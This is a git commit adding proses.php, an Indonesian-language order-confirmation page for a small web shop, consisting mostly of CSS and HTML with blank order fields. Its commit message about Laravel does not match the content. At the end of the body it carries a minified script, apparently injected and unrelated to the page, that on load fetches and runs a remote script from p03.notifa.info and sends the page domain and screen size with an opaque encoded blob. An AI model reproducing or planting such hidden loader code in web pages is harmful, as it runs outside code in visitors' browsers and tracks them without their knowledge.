eb5cf65b776ea470461406ab392762e35e45f92a
nusankuning <nusankuning@gmail.com>
2018-01-16 11:58:27 +0700

    Laravel, http://www.laravel.com/id

---
+++ proses.php
@@ -0,0 +1,211 @@
+<html>
+	<head>
+		<link rel="shortcut icon" href="file:///D|/Web UTS/PRESENTASI/tool kit/images/icontitle.png" type="image">
+
+		<link rel="icon" href="file:///D|/Web UTS/PRESENTASI/tool kit/images/icontitle.png" type="image">
+		
+		<title>Weekend Shop | Order</title>
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		
+<style>
+* {
+  box-sizing: border-box;
+}
+.menu {
+  float:left;
+  width:20%;
+  font-family:verdana;
+  text-align:center;
+}
+.menuitem {
+  background-color:black;
+  padding:8px;
+  margin-top:7px;
+  
+}
+a{
+	color:black;text-decoration:none;
+
+}
+a:hover{
+	color:#fbfbfb;text-decoration:none;
+
+
+
+}
+ul {
+
+	list-style-type: none;
+	margin: 0;
+	padding: 0;
+	overflow: hidden;
+	background-color: #fbfbfb;
+}
+li{
+	float: left;
+	color:#000;
+
+}
+li a{
+	display: block;
+	color: #000;
+	text-align: center;
+	padding: 14px 16px;
+	text-decoration: none;
+}
+li a:hover:not(.active){
+	background-color: black;
+	color:  #F00;
+}
+.active{
+	background-color: #008CBA;
+	color: white;
+}
+
+
+.main {
+  background-color: #fafafa;
+  margin-top: 10px;
+  float:left;
+  width:80%;
+  padding:0 20px;
+  font-family:verdana;
+}
+
+.img-responsive{
+	display:block;
+	max-width:100%;
+	height:auto
+}
+
+input[type=text], select {
+    width: 50%;
+    padding: 12px 20px;
+    margin: 8px 0;
+    display: inline-block;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    size: 50;
+    box-sizing: border-box;
+}
+
+textarea{
+    width: 50%;
+    height: 150px;
+    padding: 12px 20px;
+    box-sizing: border-box;
+    border: 2px solid #ccc;
+    border-radius: 4px;
+    background-color: #fafafa;
+    resize: none;
+	color:#000;
+}
+
+input[type=submit] {
+
+    width: 10%;
+    background-color: white;
+    color: black;
+    padding: 14px 20px;
+    margin: 8px 0;
+    border: 2px solid #008CBA;
+    border-radius: 4px;
+    cursor: pointer;
+}
+input[type=reset] {
+
+    width: 10%;
+    background-color: white;
+    color: black;
+    padding: 14px 20px;
+    margin: 8px 20;
+    border: 2px solid #fafafa;
+    border-radius: 4px;
+    cursor: pointer;
+
+}
+
+input[type=submit]:hover {
+    background-color: #008CBA;
+    color: white;
+}
+input[type=reset]:hover {
+    background-color: #008CBA;
+    color: white;
+}
+
+@media only screen and (max-width:620px) {
+  /* For mobile phones: */
+  .menu, .main, .right {
+    width:100%;
+  }
+}
+</style>
+	</head>
+
+	<body background-color="white">
+		<font color="fafafa">
+
+
+		<div style="background-color:#fff;padding:1px;text-align:left;">
+			<img src="img/logo.png">
+		</div>
+		
+		<ul>
+			<li><a href="index.html">HOME</a></li>
+
+		</ul>
+
+
+		
+		<br>
+	
+					<font face="verdana">
+				
+		</div>
+	</font>
+		
+		<font color="black">
+			
+	
+		<div class="main">
+
+			<font face="verdana">
+
+
+					<h3 style="text-align: justify;">Pesanan anda telah kami proses</h3>
+					<p dir="ltr"><span>Silahkan melakukan pembayaran</span><span></span></p>
+
+						Nama            : <br>
+						Alamat E-mail   : <br>
+						Nomor Handphone : <br>
+						Kode Produk     : <br>
+						Jumlah Produk   : <br>
+						Alamat Penerima : 					
+				  </form>
+
+				
+				
+			</font>
+				
+
+			<br><br>
+
+
+		</div>
+
+
+	
+		</div>
+		<div style="background-color:#fbfbfb;text-align:center;padding:10px;margin-top:7px;">
+			<table width=100%>
+			</table>
+
+
+		</div>
+	</font>
+	<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m1T0H6KosYc2MDHisl0m4DMcXXzHVxFGtYJZcgqmnw9lebUs9ma5fdKBkcs1dXTdsVC2NEKYkGGNwIermirQre95%2bdKXVQUGo6ZEoVjs47w2bVqwSo8zmEDIaCAi9BMTnRbgsnemX618SyJR3akIryzmZuqbWsev9WrR8kvLIhnEYCLj1jmzUpEbxnNdio%2fa2SMMKKWghpf4tMWvMLd%2fqN8qL%2fUyTF%2fi1VVMe6IqOlm4jjY%2fsH%2fbeibcp65%2b6X1mdJ%2f1nq9dbrTLfbsBXM4j54ZQguFYXqtClcdwrflKcpQXyLnQhrLXAxepK3FnWgEtvhvJfIMaU%2bLjOKYedBxIw9IM%2buAGVs5ofMcPJRXurlZBhfP%2fRs4lGaD0kSjeCXwdNuNazbc5jaHE8CQEOIQ%2f3tS2wpR6uRZCzKGD%2fKGAdqsvtj93eLRZ5J1nKy2WjqSBSW9xhxqauO4Ejxdfb3zFaZlzTAgJ%2bq2rFKH1VNKDNwHjQGTTrU0OOf6ax%2b0RP%2f4A1gTHyo1EvWDEf16W2WySjRB5B2hOB4CfVCjjecobiB5A%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+
+
+
+</html>
